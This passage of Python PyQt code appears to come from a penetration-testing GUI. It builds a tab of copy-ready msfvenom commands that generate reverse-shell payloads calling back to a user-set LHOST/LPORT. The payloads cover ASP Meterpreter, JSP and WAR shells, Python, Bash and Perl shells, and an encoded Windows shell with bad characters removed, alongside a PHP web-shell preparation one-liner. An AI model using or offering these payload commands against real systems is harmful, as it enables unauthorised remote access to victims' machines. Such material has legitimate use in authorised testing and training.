        if hasattr(self, 'msfv_web_php_Scan2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan2)
            self.msfv_web_php_Scan2.deleteLater()
        self.msfv_web_php_Scan2 = QLabel("cat shell.php | pbcopy && echo '<?php ' | tr -d 'n' > shell.php && pbpaste >> shell.php")
        self.msfv_web_php_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(149,self.msfv_web_php_Scan2)
     
        # msfv_web_php_Scan2_Copy
        if hasattr(self, 'msfv_web_php_Scan2_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan2_Copy)
            self.msfv_web_php_Scan2_Copy.deleteLater()
        self.msfv_web_php_Scan2_Copy = QPushButton()
        self.msfv_web_php_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_php_Scan2_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_php_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_php_Scan2.text()))
        self.msfv_web_php_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_php_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_php_Scan2_Copy)
        label_layout.addWidget(self.msfv_web_php_Scan2)
        self.tab7_container_layout.insertLayout(150, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_php_divider1
        if hasattr(self, 'msfv_web_php_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider1)
            self.msfv_web_php_divider1.deleteLater()
        self.msfv_web_php_divider1 = QFrame()
        self.msfv_web_php_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_php_divider1.setLineWidth(3)
        self.msfv_web_php_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_php_divider2
        if hasattr(self, 'msfv_web_php_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider2)
            self.msfv_web_php_divider2.deleteLater()
        self.msfv_web_php_divider2 = QFrame()
        self.msfv_web_php_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_php_divider2.setLineWidth(3)
        self.msfv_web_php_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_php_spacer1
        if hasattr(self, 'msfv_web_php_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer1)
            self.msfv_web_php_spacer1.deleteLater()
        self.msfv_web_php_spacer1 = QLabel()
        self.msfv_web_php_spacer1.setFixedWidth(40)
        self.msfv_web_php_spacer1.setFixedHeight(50)
     
        # msfv_web_php_spacer2
        if hasattr(self, 'msfv_web_php_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer2)
            self.msfv_web_php_spacer2.deleteLater()
        self.msfv_web_php_spacer2 = QLabel()
        self.msfv_web_php_spacer2.setFixedWidth(40)
        self.msfv_web_php_spacer2.setFixedHeight(50)
     
        # msfv_web_php spacer & divider layout
        self.tab7_container_layout.insertWidget(151, self.msfv_web_php_spacer1)
        self.tab7_container_layout.insertWidget(152, self.msfv_web_php_divider1)
        self.tab7_container_layout.insertWidget(153, self.msfv_web_php_divider2)
        self.tab7_container_layout.insertWidget(154, self.msfv_web_php_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_asp
        if hasattr(self, 'msfv_web_asp'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp)
            self.msfv_web_asp.deleteLater()
        self.msfv_web_asp = QLabel("[+ Web Payloads: ASP ]")
        self.msfv_web_asp.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(155,self.msfv_web_asp)
     
        # msfv_web_asp_Scan1
        if hasattr(self, 'msfv_web_asp_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp_Scan1)
            self.msfv_web_asp_Scan1.deleteLater()
        self.msfv_web_asp_Scan1 = QLabel("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f asp > shell.asp")
        self.msfv_web_asp_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(156,self.msfv_web_asp_Scan1)
     
        # msfv_web_asp_Scan1_Copy
        if hasattr(self, 'msfv_web_asp_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp_Scan1_Copy)
            self.msfv_web_asp_Scan1_Copy.deleteLater()
        self.msfv_web_asp_Scan1_Copy = QPushButton()
        self.msfv_web_asp_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_asp_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_asp_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_asp_Scan1.text()))
        self.msfv_web_asp_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_asp_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_asp_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_asp_Scan1)
        self.tab7_container_layout.insertLayout(157, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_asp_divider1
        if hasattr(self, 'msfv_web_asp_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp_divider1)
            self.msfv_web_asp_divider1.deleteLater()
        self.msfv_web_asp_divider1 = QFrame()
        self.msfv_web_asp_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_asp_divider1.setLineWidth(3)
        self.msfv_web_asp_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_asp_divider2
        if hasattr(self, 'msfv_web_asp_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp_divider2)
            self.msfv_web_asp_divider2.deleteLater()
        self.msfv_web_asp_divider2 = QFrame()
        self.msfv_web_asp_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_asp_divider2.setLineWidth(3)
        self.msfv_web_asp_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_asp_spacer1
        if hasattr(self, 'msfv_web_asp_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp_spacer1)
            self.msfv_web_asp_spacer1.deleteLater()
        self.msfv_web_asp_spacer1 = QLabel()
        self.msfv_web_asp_spacer1.setFixedWidth(40)
        self.msfv_web_asp_spacer1.setFixedHeight(50)
     
        # msfv_web_asp_spacer2
        if hasattr(self, 'msfv_web_asp_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_asp_spacer2)
            self.msfv_web_asp_spacer2.deleteLater()
        self.msfv_web_asp_spacer2 = QLabel()
        self.msfv_web_asp_spacer2.setFixedWidth(40)
        self.msfv_web_asp_spacer2.setFixedHeight(50)
     
        # msfv_web_asp spacer & divider layout
        self.tab7_container_layout.insertWidget(158, self.msfv_web_asp_spacer1)
        self.tab7_container_layout.insertWidget(159, self.msfv_web_asp_divider1)
        self.tab7_container_layout.insertWidget(160, self.msfv_web_asp_divider2)
        self.tab7_container_layout.insertWidget(161, self.msfv_web_asp_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_jsp
        if hasattr(self, 'msfv_web_jsp'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp)
            self.msfv_web_jsp.deleteLater()
        self.msfv_web_jsp = QLabel("[+ Web Payloads: JSP ]")
        self.msfv_web_jsp.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(162,self.msfv_web_jsp)
     
        # msfv_web_jsp_Scan1
        if hasattr(self, 'msfv_web_jsp_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_Scan1)
            self.msfv_web_jsp_Scan1.deleteLater()
        self.msfv_web_jsp_Scan1 = QLabel("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.jsp")
        self.msfv_web_jsp_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(163,self.msfv_web_jsp_Scan1)
     
        # msfv_web_jsp_Scan1_Copy
        if hasattr(self, 'msfv_web_jsp_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_Scan1_Copy)
            self.msfv_web_jsp_Scan1_Copy.deleteLater()
        self.msfv_web_jsp_Scan1_Copy = QPushButton()
        self.msfv_web_jsp_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_jsp_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_jsp_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_jsp_Scan1.text()))
        self.msfv_web_jsp_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_jsp_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_jsp_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_jsp_Scan1)
        self.tab7_container_layout.insertLayout(164, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_jsp_divider1
        if hasattr(self, 'msfv_web_jsp_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_divider1)
            self.msfv_web_jsp_divider1.deleteLater()
        self.msfv_web_jsp_divider1 = QFrame()
        self.msfv_web_jsp_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_jsp_divider1.setLineWidth(3)
        self.msfv_web_jsp_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_jsp_divider2
        if hasattr(self, 'msfv_web_jsp_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_divider2)
            self.msfv_web_jsp_divider2.deleteLater()
        self.msfv_web_jsp_divider2 = QFrame()
        self.msfv_web_jsp_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_jsp_divider2.setLineWidth(3)
        self.msfv_web_jsp_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_jsp_spacer1
        if hasattr(self, 'msfv_web_jsp_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_spacer1)
            self.msfv_web_jsp_spacer1.deleteLater()
        self.msfv_web_jsp_spacer1 = QLabel()
        self.msfv_web_jsp_spacer1.setFixedWidth(40)
        self.msfv_web_jsp_spacer1.setFixedHeight(50)
     
        # msfv_web_jsp_spacer2
        if hasattr(self, 'msfv_web_jsp_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_jsp_spacer2)
            self.msfv_web_jsp_spacer2.deleteLater()
        self.msfv_web_jsp_spacer2 = QLabel()
        self.msfv_web_jsp_spacer2.setFixedWidth(40)
        self.msfv_web_jsp_spacer2.setFixedHeight(50)
     
        # msfv_web_jsp spacer & divider layout
        self.tab7_container_layout.insertWidget(165, self.msfv_web_jsp_spacer1)
        self.tab7_container_layout.insertWidget(166, self.msfv_web_jsp_divider1)
        self.tab7_container_layout.insertWidget(167, self.msfv_web_jsp_divider2)
        self.tab7_container_layout.insertWidget(168, self.msfv_web_jsp_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_war
        if hasattr(self, 'msfv_web_war'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war)
            self.msfv_web_war.deleteLater()
        self.msfv_web_war = QLabel("[+ Web Payloads: WAR ]")
        self.msfv_web_war.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(169,self.msfv_web_war)
     
        # msfv_web_war_Scan1
        if hasattr(self, 'msfv_web_war_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war_Scan1)
            self.msfv_web_war_Scan1.deleteLater()
        self.msfv_web_war_Scan1 = QLabel("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f war > shell.war")
        self.msfv_web_war_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(170,self.msfv_web_war_Scan1)
     
        # msfv_web_war_Scan1_Copy
        if hasattr(self, 'msfv_web_war_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war_Scan1_Copy)
            self.msfv_web_war_Scan1_Copy.deleteLater()
        self.msfv_web_war_Scan1_Copy = QPushButton()
        self.msfv_web_war_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_war_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_war_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_war_Scan1.text()))
        self.msfv_web_war_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_war_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_war_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_war_Scan1)
        self.tab7_container_layout.insertLayout(171, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_war_divider1
        if hasattr(self, 'msfv_web_war_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war_divider1)
            self.msfv_web_war_divider1.deleteLater()
        self.msfv_web_war_divider1 = QFrame()
        self.msfv_web_war_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_war_divider1.setLineWidth(3)
        self.msfv_web_war_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_war_divider2
        if hasattr(self, 'msfv_web_war_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war_divider2)
            self.msfv_web_war_divider2.deleteLater()
        self.msfv_web_war_divider2 = QFrame()
        self.msfv_web_war_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_war_divider2.setLineWidth(3)
        self.msfv_web_war_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_war_spacer1
        if hasattr(self, 'msfv_web_war_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war_spacer1)
            self.msfv_web_war_spacer1.deleteLater()
        self.msfv_web_war_spacer1 = QLabel()
        self.msfv_web_war_spacer1.setFixedWidth(40)
        self.msfv_web_war_spacer1.setFixedHeight(50)
     
        # msfv_web_war_spacer2
        if hasattr(self, 'msfv_web_war_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_war_spacer2)
            self.msfv_web_war_spacer2.deleteLater()
        self.msfv_web_war_spacer2 = QLabel()
        self.msfv_web_war_spacer2.setFixedWidth(40)
        self.msfv_web_war_spacer2.setFixedHeight(50)
     
        # msfv_web_war spacer & divider layout
        self.tab7_container_layout.insertWidget(172, self.msfv_web_war_spacer1)
        self.tab7_container_layout.insertWidget(173, self.msfv_web_war_divider1)
        self.tab7_container_layout.insertWidget(174, self.msfv_web_war_divider2)
        self.tab7_container_layout.insertWidget(175, self.msfv_web_war_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_python
        if hasattr(self, 'msfv_web_python'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python)
            self.msfv_web_python.deleteLater()
        self.msfv_web_python = QLabel("[+ Scripting Payloads: Python ]")
        self.msfv_web_python.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(176,self.msfv_web_python)
     
        # msfv_web_python_Scan1
        if hasattr(self, 'msfv_web_python_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python_Scan1)
            self.msfv_web_python_Scan1.deleteLater()
        self.msfv_web_python_Scan1 = QLabel("msfvenom -p cmd/unix/reverse_python LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.py")
        self.msfv_web_python_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(177,self.msfv_web_python_Scan1)
     
        # msfv_web_python_Scan1_Copy
        if hasattr(self, 'msfv_web_python_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python_Scan1_Copy)
            self.msfv_web_python_Scan1_Copy.deleteLater()
        self.msfv_web_python_Scan1_Copy = QPushButton()
        self.msfv_web_python_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_python_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_python_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_python_Scan1.text()))
        self.msfv_web_python_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_python_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_python_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_python_Scan1)
        self.tab7_container_layout.insertLayout(178, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_python_divider1
        if hasattr(self, 'msfv_web_python_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python_divider1)
            self.msfv_web_python_divider1.deleteLater()
        self.msfv_web_python_divider1 = QFrame()
        self.msfv_web_python_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_python_divider1.setLineWidth(3)
        self.msfv_web_python_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_python_divider2
        if hasattr(self, 'msfv_web_python_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python_divider2)
            self.msfv_web_python_divider2.deleteLater()
        self.msfv_web_python_divider2 = QFrame()
        self.msfv_web_python_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_python_divider2.setLineWidth(3)
        self.msfv_web_python_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_python_spacer1
        if hasattr(self, 'msfv_web_python_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python_spacer1)
            self.msfv_web_python_spacer1.deleteLater()
        self.msfv_web_python_spacer1 = QLabel()
        self.msfv_web_python_spacer1.setFixedWidth(40)
        self.msfv_web_python_spacer1.setFixedHeight(50)
     
        # msfv_web_python_spacer2
        if hasattr(self, 'msfv_web_python_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_python_spacer2)
            self.msfv_web_python_spacer2.deleteLater()
        self.msfv_web_python_spacer2 = QLabel()
        self.msfv_web_python_spacer2.setFixedWidth(40)
        self.msfv_web_python_spacer2.setFixedHeight(50)
     
        # msfv_web_python spacer & divider layout
        self.tab7_container_layout.insertWidget(179, self.msfv_web_python_spacer1)
        self.tab7_container_layout.insertWidget(180, self.msfv_web_python_divider1)
        self.tab7_container_layout.insertWidget(181, self.msfv_web_python_divider2)
        self.tab7_container_layout.insertWidget(182, self.msfv_web_python_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_bash
        if hasattr(self, 'msfv_web_bash'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash)
            self.msfv_web_bash.deleteLater()
        self.msfv_web_bash = QLabel("[+ Scripting Payloads: Bash ]")
        self.msfv_web_bash.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(183,self.msfv_web_bash)
     
        # msfv_web_bash_Scan1
        if hasattr(self, 'msfv_web_bash_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash_Scan1)
            self.msfv_web_bash_Scan1.deleteLater()
        self.msfv_web_bash_Scan1 = QLabel("msfvenom -p cmd/unix/reverse_bash LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.sh")
        self.msfv_web_bash_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(184,self.msfv_web_bash_Scan1)
     
        # msfv_web_bash_Scan1_Copy
        if hasattr(self, 'msfv_web_bash_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash_Scan1_Copy)
            self.msfv_web_bash_Scan1_Copy.deleteLater()
        self.msfv_web_bash_Scan1_Copy = QPushButton()
        self.msfv_web_bash_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_bash_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_bash_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_bash_Scan1.text()))
        self.msfv_web_bash_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_bash_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_bash_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_bash_Scan1)
        self.tab7_container_layout.insertLayout(185, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_bash_divider1
        if hasattr(self, 'msfv_web_bash_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash_divider1)
            self.msfv_web_bash_divider1.deleteLater()
        self.msfv_web_bash_divider1 = QFrame()
        self.msfv_web_bash_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_bash_divider1.setLineWidth(3)
        self.msfv_web_bash_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_bash_divider2
        if hasattr(self, 'msfv_web_bash_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash_divider2)
            self.msfv_web_bash_divider2.deleteLater()
        self.msfv_web_bash_divider2 = QFrame()
        self.msfv_web_bash_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_bash_divider2.setLineWidth(3)
        self.msfv_web_bash_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_bash_spacer1
        if hasattr(self, 'msfv_web_bash_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash_spacer1)
            self.msfv_web_bash_spacer1.deleteLater()
        self.msfv_web_bash_spacer1 = QLabel()
        self.msfv_web_bash_spacer1.setFixedWidth(40)
        self.msfv_web_bash_spacer1.setFixedHeight(50)
     
        # msfv_web_bash_spacer2
        if hasattr(self, 'msfv_web_bash_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_bash_spacer2)
            self.msfv_web_bash_spacer2.deleteLater()
        self.msfv_web_bash_spacer2 = QLabel()
        self.msfv_web_bash_spacer2.setFixedWidth(40)
        self.msfv_web_bash_spacer2.setFixedHeight(50)
     
        # msfv_web_bash spacer & divider layout
        self.tab7_container_layout.insertWidget(186, self.msfv_web_bash_spacer1)
        self.tab7_container_layout.insertWidget(187, self.msfv_web_bash_divider1)
        self.tab7_container_layout.insertWidget(188, self.msfv_web_bash_divider2)
        self.tab7_container_layout.insertWidget(189, self.msfv_web_bash_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_perl
        if hasattr(self, 'msfv_web_perl'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl)
            self.msfv_web_perl.deleteLater()
        self.msfv_web_perl = QLabel("[+ Scripting Payloads: Perl ]")
        self.msfv_web_perl.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(190,self.msfv_web_perl)
     
        # msfv_web_perl_Scan1
        if hasattr(self, 'msfv_web_perl_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl_Scan1)
            self.msfv_web_perl_Scan1.deleteLater()
        self.msfv_web_perl_Scan1 = QLabel("msfvenom -p cmd/unix/reverse_perl LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.pl")
        self.msfv_web_perl_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(191,self.msfv_web_perl_Scan1)
     
        # msfv_web_perl_Scan1_Copy
        if hasattr(self, 'msfv_web_perl_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl_Scan1_Copy)
            self.msfv_web_perl_Scan1_Copy.deleteLater()
        self.msfv_web_perl_Scan1_Copy = QPushButton()
        self.msfv_web_perl_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_perl_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_perl_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_perl_Scan1.text()))
        self.msfv_web_perl_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_perl_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_perl_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_perl_Scan1)
        self.tab7_container_layout.insertLayout(192, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_perl_divider1
        if hasattr(self, 'msfv_web_perl_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl_divider1)
            self.msfv_web_perl_divider1.deleteLater()
        self.msfv_web_perl_divider1 = QFrame()
        self.msfv_web_perl_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_perl_divider1.setLineWidth(3)
        self.msfv_web_perl_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_perl_divider2
        if hasattr(self, 'msfv_web_perl_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl_divider2)
            self.msfv_web_perl_divider2.deleteLater()
        self.msfv_web_perl_divider2 = QFrame()
        self.msfv_web_perl_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_perl_divider2.setLineWidth(3)
        self.msfv_web_perl_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_perl_spacer1
        if hasattr(self, 'msfv_web_perl_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl_spacer1)
            self.msfv_web_perl_spacer1.deleteLater()
        self.msfv_web_perl_spacer1 = QLabel()
        self.msfv_web_perl_spacer1.setFixedWidth(40)
        self.msfv_web_perl_spacer1.setFixedHeight(50)
     
        # msfv_web_perl_spacer2
        if hasattr(self, 'msfv_web_perl_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_perl_spacer2)
            self.msfv_web_perl_spacer2.deleteLater()
        self.msfv_web_perl_spacer2 = QLabel()
        self.msfv_web_perl_spacer2.setFixedWidth(40)
        self.msfv_web_perl_spacer2.setFixedHeight(50)
     
        # msfv_web_perl spacer & divider layout
        self.tab7_container_layout.insertWidget(193, self.msfv_web_perl_spacer1)
        self.tab7_container_layout.insertWidget(194, self.msfv_web_perl_divider1)
        self.tab7_container_layout.insertWidget(195, self.msfv_web_perl_divider2)
        self.tab7_container_layout.insertWidget(196, self.msfv_web_perl_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_badchar
        if hasattr(self, 'msfv_web_badchar'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar)
            self.msfv_web_badchar.deleteLater()
        self.msfv_web_badchar = QLabel("[+ Creating an Msfvenom Payload with an encoder while removing bad characters ]")
        self.msfv_web_badchar.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(197,self.msfv_web_badchar)
     
        # msfv_web_badchar_Scan1
        if hasattr(self, 'msfv_web_badchar_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_Scan1)
            self.msfv_web_badchar_Scan1.deleteLater()
        self.msfv_web_badchar_Scan1 = QLabel("msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=" + self.lhost + " LPORT=" + self.lport + " -f c -e x86/shikata_ga_nai -b \"x0Ax0D\"")
        self.msfv_web_badchar_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(198,self.msfv_web_badchar_Scan1)
     
        # msfv_web_badchar_Scan1_Copy
        if hasattr(self, 'msfv_web_badchar_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_Scan1_Copy)
            self.msfv_web_badchar_Scan1_Copy.deleteLater()
        self.msfv_web_badchar_Scan1_Copy = QPushButton()
        self.msfv_web_badchar_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_badchar_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_badchar_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_badchar_Scan1.text()))
        self.msfv_web_badchar_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_badchar_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_badchar_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_badchar_Scan1)
        self.tab7_container_layout.insertLayout(199, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_badchar_divider1
        if hasattr(self, 'msfv_web_badchar_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_divider1)
            self.msfv_web_badchar_divider1.deleteLater()
        self.msfv_web_badchar_divider1 = QFrame()
        self.msfv_web_badchar_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_badchar_divider1.setLineWidth(3)
        self.msfv_web_badchar_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_badchar_divider2
        if hasattr(self, 'msfv_web_badchar_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_divider2)
            self.msfv_web_badchar_divider2.deleteLater()
        self.msfv_web_badchar_divider2 = QFrame()
        self.msfv_web_badchar_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_badchar_divider2.setLineWidth(3)
